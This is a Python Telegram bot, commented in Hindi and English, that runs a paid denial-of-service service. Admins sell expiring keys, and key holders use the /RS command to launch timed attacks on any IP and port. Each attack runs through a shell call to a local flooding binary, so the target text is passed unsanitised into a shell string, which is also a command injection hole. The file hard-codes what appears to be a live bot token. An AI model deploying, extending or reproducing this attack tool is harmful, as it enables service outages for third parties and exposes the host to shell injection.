#!/usr/bin/python3
import telebot
import datetime
import subprocess
import threading
import random
import string
import pytz
import json
import os
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton  # ✅ FIXED IMPORT ERROR

# ✅ TELEGRAM BOT TOKEN
bot = telebot.TeleBot('7053228704:AAGOtH3AKk_Xhs-BiqzJj0NcHvb47cvRYsg')

# ✅ GROUP AND ADMIN DETAILS
GROUP_ID = "-1002252633433"
ADMINS = ["7129010361"]

SCREENSHOT_CHANNEL = "@KHAPITAR_BALAK77"

# ✅ FILE PATHS
USER_FILE = "users.txt"
KEY_FILE = "keys.txt"
REDEEM_LOG_FILE = "redeem_log.json"

# ✅ Timezone सेट (IST)
IST = pytz.timezone('Asia/Kolkata')

# ✅ Redeem Log लोड/सेव फंक्शन
def load_redeem_log():
    try:
        with open(REDEEM_LOG_FILE, "r") as file:
            return json.load(file)
    except (FileNotFoundError, json.JSONDecodeError):
        return {}

def save_redeem_log(log):
    with open(REDEEM_LOG_FILE, "w") as file:
        json.dump(log, file)

redeem_log = load_redeem_log()

# ✅ Key और User डेटा लोड करने के फंक्शन
def read_keys():
    keys = {}
    try:
        with open(KEY_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                parts = line.split()
                if len(parts) >= 2:
                    key = parts[0]
                    expiry_str = " ".join(parts[1:])
                    try:
                        expiry = datetime.datetime.strptime(expiry_str, '%Y-%m-%d %H:%M:%S')
                        expiry = IST.localize(expiry)
                        keys[key] = expiry
                    except ValueError:
                        print(f"⚠ Error parsing date for key {key}: {expiry_str}")
    except FileNotFoundError:
        pass
    return keys

def write_keys(keys):
    with open(KEY_FILE, "w") as file:
        for key, expiry in keys.items():
            file.write(f"{key} {expiry.strftime('%Y-%m-%d %H:%M:%S')}\n")

def read_users():
    users = set()
    try:
        with open(USER_FILE, "r") as file:
            users = set(file.read().splitlines())
    except FileNotFoundError:
        pass
    return users

allowed_users = read_users()
keys = read_keys()

# ✅ Expired Users को Remove करने का फंक्शन
def remove_expired_users():
    now = datetime.datetime.now(IST)
    expired_users = []

    for user_id, key in redeem_log.items():
        if key in keys and now > keys[key]:
            expired_users.append(user_id)

    for user_id in expired_users:
        if user_id in allowed_users:
            allowed_users.remove(user_id)
        del redeem_log[user_id]

    for key in list(keys.keys()):
        if now > keys[key]:
            del keys[key]

    save_redeem_log(redeem_log)
    write_keys(keys)

    with open(USER_FILE, "w") as file:
        file.writelines("\n".join(allowed_users))

# ✅ बॉट स्टार्ट होने पर Expired Users Remove करें
remove_expired_users()

# ✅ Key Generate, Validate, Remove
def generate_key(days=0, hours=0):
    new_key = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
    expiry = datetime.datetime.now(IST) + datetime.timedelta(days=days, hours=hours)  # ✅ Fix: expiry अब सही से बन रहा है
    keys[new_key] = expiry
    write_keys(keys)
    return new_key

def remove_key(key):
    if key in keys:
        del keys[key]
        write_keys(keys)

        # ✅ अब उस Key को यूज़ करने वाले यूज़र को भी हटाओ
        user_to_remove = None
        for user_id, user_key in redeem_log.items():
            if user_key == key:
                user_to_remove = user_id
                break

        if user_to_remove:
            redeem_log.pop(user_to_remove, None)  # ✅ User को redeem_log से हटाओ
            allowed_users.discard(user_to_remove)  # ✅ User को allowed_users से हटाओ

            # ✅ Users file अपडेट करो
            with open(USER_FILE, "w") as file:
                file.writelines("\n".join(allowed_users))

            save_redeem_log(redeem_log)  # ✅ Updated Log Save करो

        return True
    return False

def is_user_allowed(user_id):
    now = datetime.datetime.now(IST)
    if user_id in redeem_log:
        key = redeem_log[user_id]
        if key in keys and now > keys[key]:
            # ✅ अगर Key expire हो गई, तो यूजर को remove कर दो
            del keys[key]  # Expired Key हटाओ
            del redeem_log[user_id]  # Redeem Log से यूजर हटाओ
            allowed_users.discard(user_id)  # Allowed Users से हटाओ
            save_redeem_log(redeem_log)
            write_keys(keys)

            # ✅ Users file अपडेट करो
            with open(USER_FILE, "w") as file:
                file.writelines("\n".join(allowed_users))
            return False  # ❌ अब यह यूजर blocked हो गया
    return user_id in allowed_users

# ✅ /START Command (Welcome + Help Button)
@bot.message_handler(commands=['start'])
def start_command(message):
    user = message.from_user
    first_name = user.first_name if user.first_name else "User"

    # ✅ Inline Button for Help
    markup = InlineKeyboardMarkup()
    help_button = InlineKeyboardButton("ℹ HELP", callback_data="show_help")
    markup.add(help_button)

    welcome_text = f"👋 **WELCOME, {first_name}!**\nमैं तुम्हारी हेल्प के लिए यहाँ हूँ। नीचे दिए गए बटन पर क्लिक करो:"

    bot.send_message(message.chat.id, welcome_text, reply_markup=markup, parse_mode="Markdown")


# ✅ CALLBACK HANDLER FOR HELP BUTTON
@bot.callback_query_handler(func=lambda call: call.data == "show_help")
def help_callback(call):
    help_text = """
📌 **BOT COMMANDS LIST:**  

👤 **USER COMMANDS:**  
🔹 `/myinfo` - अपना स्टेटस और Key की Expiry चेक करो  
🔹 `/redeem <KEY>` - एक्सेस पाने के लिए Key रिडीम करो  
🔹 `/RS <IP> <PORT> <TIME>` - अटैक स्टार्ट करो  

👑 **ADMIN COMMANDS:**  
🔹 `/genkey <DAYS> [HOURS]` - नई Key बनाओ  
🔹 `/removekey <KEY>` - किसी Key को डिलीट करो  
🔹 `/stats` - एक्टिव अटैक्स को देखो  
🔹 `/check` - सभी एक्टिव Keys को देखो  
"""

    bot.send_message(call.message.chat.id, help_text, parse_mode="Markdown")

# ✅ /GENKEY Command (Admin Only)
# ✅ /GENKEY Command (Admin Only) - Now Generates Keys in "1H-RSVIP-XXXXXX" Format
@bot.message_handler(commands=['genkey'])
def generate_new_key(message):
    if str(message.from_user.id) not in ADMINS:
        bot.reply_to(message, "❌ ADMIN ONLY COMMAND!")
        return  # **✅ फिक्स: अगर एडमिन नहीं है तो रिटर्न करो**

    command = message.text.split()

    if len(command) < 2:
        bot.reply_to(message, "⚠ USAGE: /genkey <DAYS> [HOURS]")
        return  # **✅ फिक्स: अगर कमांड सही फॉर्मेट में नहीं है तो रिटर्न करो**

    try:
        days = int(command[1])
        hours = int(command[2]) if len(command) > 2 else 0  # ✅ अब घंटे भी ऐड हो सकते हैं
    except ValueError:
        bot.reply_to(message, "❌ DAYS AND HOURS MUST BE NUMBERS!")
        return

    # ✅ अब की का फॉर्मेट सही बनाते हैं
    if days > 0 and hours == 0:
        prefix = f"{days}D-RSVIP"
    elif hours > 0 and days == 0:
        prefix = f"{hours}H-RSVIP"
    else:
        prefix = f"{days}D{hours}H-RSVIP"

    random_part = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))  # ✅ 6 Random Characters
    new_key = f"{prefix}-{random_part}"

    expiry = datetime.datetime.now(IST) + datetime.timedelta(days=days, hours=hours)
    keys[new_key] = expiry
    write_keys(keys)

    bot.reply_to(message, f"✅ NEW KEY GENERATED:\n🔑 `{new_key}`\n📅 Expiry: {days} Days, {hours} Hours", parse_mode="Markdown")

# ✅ /REMOVEKEY Command (Admin Only)
@bot.message_handler(commands=['removekey'])
def remove_existing_key(message):
    if str(message.from_user.id) not in ADMINS:
         bot.reply_to(message, "❌ ADMIN ONLY COMMAND!")

    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "⚠ USAGE: /removekey <KEY>")
        return 

    if remove_key(command[1]):
        bot.reply_to(message, "✅ KEY REMOVED SUCCESSFULLY!")
    else:
        bot.reply_to(message, "❌ KEY NOT FOUND!")

# ✅ FIXED: SCREENSHOT SYSTEM (Now Always Forwards)
# ✅ SCREENSHOT VERIFICATION SYSTEM (Detects Fake Screenshots)
@bot.message_handler(content_types=['photo'])
def handle_screenshot(message):
    user_id = message.from_user.id

    # ✅ Get File ID & Caption
    file_id = message.photo[-1].file_id
    caption_text = f"📸 **USER SCREENSHOT RECEIVED!**\n👤 **User ID:** `{user_id}`\n✅ **Forwarded to Admins!`"

    # ✅ Send Screenshot to Verification Channel
    bot.send_photo(SCREENSHOT_CHANNEL, file_id, caption=caption_text, parse_mode="Markdown")

    # ✅ AI-Based Fake Screenshot Detection (Basic)
    # **ये सिर्फ डेमो है, असली AI इंटेग्रेशन के लिए OCR & Metadata चेक ऐड कर सकते हो**
    if "old" in message.caption.lower() or "fake" in message.caption.lower():
        bot.reply_to(message, "⚠ **WARNING:** लगता है कि यह **फेक या पुराना स्क्रीनशॉट** है! 🚨")
    else:
        bot.reply_to(message, "✅ SCREENSHOT VERIFIED & FORWARDED!")

    bot.reply_to(message, "📤 **SCREENSHOT FORWARDED SUCCESSFULLY!**")

    bot.reply_to(message, "✅ SCREENSHOT FORWARDED SUCCESSFULLY!")

# ✅ Active Attacks को Track करने वाला Dictionary  
active_attacks = {}

# ✅ /REDEEM Command (User Access)
@bot.message_handler(commands=['redeem'])
def redeem_key(message):
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "⚠ USAGE: /redeem <KEY>")
        return

    user_id = str(message.from_user.id)
    user_name = message.from_user.first_name  
    key = command[1]

    # ✅ अगर User पहले से कोई Key Redeem कर चुका है
    if user_id in redeem_log:
        bot.reply_to(message, f"❌ YOU HAVE ALREADY REDEEMED A KEY!\n🔑 **Your Key:** `{redeem_log[user_id]}`", parse_mode="Markdown")
        return

    # ✅ Check अगर Key Exist नहीं करती  
    if key not in keys:
        bot.reply_to(message, "❌ INVALID KEY! 🔑")  
        return

    # ✅ अगर Key Expired हो गई है  
    expiry_date = keys[key]
    if datetime.datetime.now(IST) > expiry_date:
        del keys[key]  # ✅ Expired Key हटाओ
        write_keys(keys)
        bot.reply_to(message, f"⏳ THIS KEY HAS **EXPIRED!**\n📅 **Expired On:** `{expiry_date.strftime('%Y-%m-%d %H:%M:%S IST')}`", parse_mode="Markdown")
        return

    # ✅ Check अगर Key पहले से किसी और ने Redeem कर ली है  
    if key in redeem_log.values():
        existing_user = [uid for uid, k in redeem_log.items() if k == key][0]
        bot.reply_to(message, f"❌ THIS KEY HAS ALREADY BEEN REDEEMED!\n👤 **User ID:** `{existing_user}`", parse_mode="Markdown")
        return

    # ✅ Grant Access & Save User  
    allowed_users.add(user_id)
    redeem_log[user_id] = key
    save_redeem_log(redeem_log)

    with open(USER_FILE, "a") as file:
        file.write(f"{user_id}\n")

    bot.reply_to(message, f"🎉 ACCESS GRANTED!\n👤 **User:** `{user_name}`\n🆔 **User ID:** `{user_id}`\n🔑 **Key:** `{key}`\n📅 **Expires On:** `{expiry_date.strftime('%Y-%m-%d %H:%M:%S IST')}`", parse_mode="Markdown")

## ✅ /RS Attack Command (Auto-Remove from /stats)
@bot.message_handler(commands=['RS'])
def handle_attack(message):
    user_id = str(message.from_user.id)
    chat_id = str(message.chat.id)

    if not is_user_allowed(user_id):  # ✅ Expired Key Check
        bot.reply_to(message, "⏳ **YOUR KEY NOT APPROVED! PLEASE REDEEM A NEW KEY.**")

    if chat_id != GROUP_ID:
        bot.reply_to(message, "❌ YOU CAN USE THIS COMMAND ONLY IN THE ATTACK GROUP!")
        return

    if user_id not in allowed_users:
        bot.reply_to(message, "❌ KEY BUY KRKE AANA MATHERCOD! FREE MAIN NHI MILEGA DM- @R_DANGER77 ")
        return

    command = message.text.split()
    if len(command) != 4:
        bot.reply_to(message, "⚠ USAGE: /RS <IP> <PORT> <TIME>")
        return

    target, port, time_duration = command[1], command[2], command[3]

    try:
        port = int(port)
        time_duration = int(time_duration)
    except ValueError:
        bot.reply_to(message, "❌ PORT AND TIME MUST BE NUMBERS!")
        return

    if time_duration > 240:
        bot.reply_to(message, "🚫 MAX ATTACK TIME IS 240 SECONDS!")
        return

    if user_id not in active_attacks:
        active_attacks[user_id] = []

    if len(active_attacks[user_id]) >= 3:
        bot.reply_to(message, "❌ MAXIMUM 3 ATTACKS ALLOWED AT A TIME! WAIT FOR AN ATTACK TO FINISH.")
        return

    end_time = datetime.datetime.now(IST) + datetime.timedelta(seconds=time_duration)
    active_attacks[user_id].append((target, port, end_time))

    bot.reply_to(message, f"🔥 ATTACK STARTED!\n🎯 TARGET: {target}\n🔢 PORT: {port}\n⏳ DURATION: {time_duration}s")

    def attack_execution():
        try:
            subprocess.run(f"./megoxer {target} {port} {time_duration} 900", shell=True, check=True, timeout=time_duration)
        except subprocess.TimeoutExpired:
            bot.reply_to(message, "❌ ATTACK TIMEOUT! SCREENSHOT OPTIONAL Hai, SEND KROGE TOH CHANNEL PE FORWARD HOGA!")
        except subprocess.CalledProcessError:
            bot.reply_to(message, "❌ ATTACK FAILED!")

        # ✅ अटैक खत्म होते ही लिस्ट से हटा दो
        active_attacks[user_id] = [attack for attack in active_attacks[user_id] if attack[0] != target]
        if not active_attacks[user_id]:  # अगर कोई अटैक बचा नहीं, तो एंट्री ही हटा दो
            del active_attacks[user_id]

    threading.Thread(target=attack_execution).start()

# ✅ /STATS Command - Shows Only Active Attacks
# ✅ /STATS Command - Shows Only Active Attacks
@bot.message_handler(commands=['stats'])
def attack_stats(message):
    if not active_attacks:  # ✅ INDENTATION FIXED
        bot.reply_to(message, "📊 No Active Attacks Right Now!")
        return  # ✅ यह लाइन सही से इंडेंट होनी चाहिए

    now = datetime.datetime.now(IST)

    # ✅ खत्म हुए अटैक हटाओ
    for user_id in list(active_attacks.keys()):
        active_attacks[user_id] = [attack for attack in active_attacks[user_id] if attack[2] > now]
        if not active_attacks[user_id]:  
            del active_attacks[user_id]

    stats_message = "📊 **ACTIVE ATTACKS:**\n\n"

    for user_id, attacks in active_attacks.items():
        stats_message += f"👤 **User ID:** `{user_id}`\n"
        for target, port, end_time in attacks:
            remaining_time = (end_time - now).total_seconds()
            stats_message += f"🚀 **Target:** `{target}`\n🎯 **Port:** `{port}`\n⏳ **Ends In:** `{int(remaining_time)}s`\n\n"

    bot.reply_to(message, stats_message, parse_mode="Markdown")

# ✅ /MYINFO Command (Shows User Details + Key Expiry)
@bot.message_handler(commands=['myinfo'])
def my_info(message):
    user = message.from_user
    user_id = str(user.id)
    username = user.username if user.username else "N/A"
    first_name = user.first_name if user.first_name else "N/A"
    last_name = user.last_name if user.last_name else "N/A"

    # ✅ अगर यूजर की Key एक्सपायर हो चुकी है
    if not is_user_allowed(user_id):
        bot.reply_to(message, "⏳ **PEHLE KEY BIY KR! PLEASE REDEEM A KEY.**")
        return  # ✅ FIX: यहाँ से फंक्शन को रोक देना चाहिए

    is_admin = "✅ YES" if user_id in ADMINS else "❌ NO"
    has_access = "✅ YES" if user_id in allowed_users else "❌ NO"

    # ✅ Key Details Check
    if user_id in redeem_log:
        user_key = redeem_log[user_id]
        expiry_date = keys.get(user_key, None)
        if expiry_date:
            expiry_text = expiry_date.strftime('%Y-%m-%d %H:%M:%S IST')
        else:
            expiry_text = "❌ EXPIRED"
    else:
        user_key = "❌ NO KEY"
        expiry_text = "N/A"

    info_text = f"""
👤 **User Info:**
🆔 **User ID:** `{user_id}`
🔹 **Username:** `{username}`
👑 **Admin:** {is_admin}
🎟 **Access:** {has_access}

🔑 **Key Details:**
🔹 **Key:** `{user_key}`
📅 **Expiry:** `{expiry_text}`
"""
    bot.reply_to(message, info_text, parse_mode="Markdown")

# ✅ /ANNOUNCE Command (Admin Only)
@bot.message_handler(commands=['announce'])
def announce_message(message):
    if str(message.from_user.id) not in ADMINS:
        bot.reply_to(message, "❌ ADMIN ONLY COMMAND!")
        return

    command = message.text.split(maxsplit=1)
    if len(command) < 2:
        bot.reply_to(message, "⚠ USAGE: /announce <message>")
        return

    announcement = f"📢 **ANNOUNCEMENT:**\n{command[1]}"
    
    # ✅ Auto-Pin Announcement
    msg = bot.send_message(GROUP_ID, announcement, parse_mode="Markdown")
    bot.pin_chat_message(GROUP_ID, msg.message_id)

    # ✅ Auto-Delete After 2 Hours (7200 seconds)
    threading.Timer(7200, lambda: bot.delete_message(GROUP_ID, msg.message_id)).start()

    bot.reply_to(message, "✅ ANNOUNCEMENT SENT & PINNED!")

# ✅ BOT START (Load Data and Run)
bot.polling(none_stop=True)
